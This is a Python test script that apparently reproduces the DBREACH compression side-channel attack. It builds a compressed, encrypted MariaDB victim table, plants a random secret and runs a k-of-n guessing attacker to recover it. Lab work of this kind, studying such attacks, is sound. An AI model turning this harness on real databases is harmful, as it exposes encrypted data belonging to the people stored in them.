# test_attack.py

import utils.mariadb_utils as utils
import dbreacher
import dbreacher_impl
import k_of_n_attacker
import random
import string
import time

maxRowSize = 200

control = utils.MariaDBController("flask_db")

table = "victimtable"
control.drop_table(table)
control.create_basic_table(
    table,
    varchar_len=maxRowSize,
    compressed=True,
    encrypted=True
)

print("Reading in all guesses... \n")
possibilities = []
with open("demo_names.txt") as f:
    for line in f:
        name = line.strip().lower()
        possibilities.append(name)
        if len(possibilities) > 100:
            break


known_prefix = ''.join(random.choices(string.ascii_lowercase, k=10)) 

num_secrets = 1
for i in range(num_secrets):
    secret = random.choice(possibilities)
    print("Secret = " + secret)
    control.insert_row(table, i, secret)


# Instantiate DBREACHerImpl with sufficient numFillerRows
dbreacher_instance = dbreacher_impl.DBREACHerImpl(
    controller=control,
    tablename=table,
    startIdx=0,  # Assuming startIdx starts at 0
    maxRowSize=maxRowSize,
    fillerCharSet=set(string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation),
    compressCharAscii=ord('*'),
    numFillerRows=205  # 필러 수를 205로 설정 (필요에 따라 조정 가능)
)

attacker = k_of_n_attacker.kOfNAttacker(num_secrets + 4, dbreacher_instance, possibilities, True)
success = attacker.setUp()
if not success:
    print("Setup failed")
else:
    print("Setup succeeded")
    attacker.tryAllGuesses(verbose=True)
    winners = attacker.getTopKGuesses()
    print(winners)
